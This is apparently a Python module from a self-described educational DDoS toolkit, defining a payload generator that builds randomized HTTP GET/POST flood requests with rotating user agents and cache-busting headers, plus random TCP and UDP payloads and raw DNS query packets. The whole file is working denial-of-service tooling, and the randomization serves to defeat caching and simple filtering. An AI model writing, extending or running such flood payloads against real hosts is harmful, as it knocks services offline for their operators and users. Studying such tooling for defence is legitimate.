#!/usr/bin/env python3
"""
DDOS Attack Educational Toolkit - Payload Generator
Author: Rajsaraswati Jatav
Purpose: Dynamic payload creation for different attack types
"""

import random
import string
import json
from urllib.parse import quote
from utils.logger import Logger

class PayloadGenerator:
    def __init__(self):
        self.logger = Logger()
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
        ]
        
    def generate_http_payload(self, target_url, method='GET', custom_headers=None):
        """Generate HTTP request payload"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': random.choice(['no-cache', 'max-age=0', 'no-store'])
        }
        
        if custom_headers:
            headers.update(custom_headers)
        
        if method == 'GET':
            params = self._generate_random_params()
            if '?' not in target_url:
                target_url += '?' + params
            else:
                target_url += '&' + params
        
        payload = f"{method} {target_url} HTTP/1.1\r\n"
        for key, value in headers.items():
            payload += f"{key}: {value}\r\n"
        payload += "\r\n"
        
        if method == 'POST':
            post_data = self._generate_post_data()
            payload += post_data
        
        return payload.encode('utf-8')
    
    def generate_tcp_payload(self, size=1024):
        """Generate random TCP payload"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=size)).encode()
    
    def generate_udp_payload(self, size=512):
        """Generate random UDP payload"""
        payload_types = [
            self._generate_dns_query(),
            self._generate_random_bytes(size)
        ]
        return random.choice(payload_types)
    
    def _generate_random_params(self):
        """Generate random URL parameters"""
        param_names = ['id', 'page', 'sort', 'filter', 'search']
        params = []
        
        for _ in range(random.randint(1, 5)):
            name = random.choice(param_names)
            value = random.randint(1, 1000)
            params.append(f"{name}={value}")
        
        return '&'.join(params)
    
    def _generate_post_data(self):
        """Generate random POST data"""
        fields = {
            'username': ''.join(random.choices(string.ascii_lowercase, k=8)),
            'password': ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
            'data': ''.join(random.choices(string.ascii_letters, k=random.randint(100, 500)))
        }
        
        return '&'.join([f"{k}={quote(str(v))}" for k, v in fields.items()])
    
    def _generate_dns_query(self):
        """Generate DNS query packet"""
        query_id = random.randint(0, 65535).to_bytes(2, 'big')
        flags = b'\x01\x00'
        questions = b'\x00\x01'
        answers = b'\x00\x00'
        authority = b'\x00\x00'
        additional = b'\x00\x00'
        
        domain = f"test{random.randint(1, 1000)}.example.com"
        query = b''
        for part in domain.split('.'):
            query += len(part).to_bytes(1, 'big') + part.encode()
        query += b'\x00'
        query += b'\x00\x01'
        query += b'\x00\x01'
        
        return query_id + flags + questions + answers + authority + additional + query
    
    def _generate_random_bytes(self, size):
        """Generate random byte payload"""
        return bytes([random.randint(0, 255) for _ in range(size)])
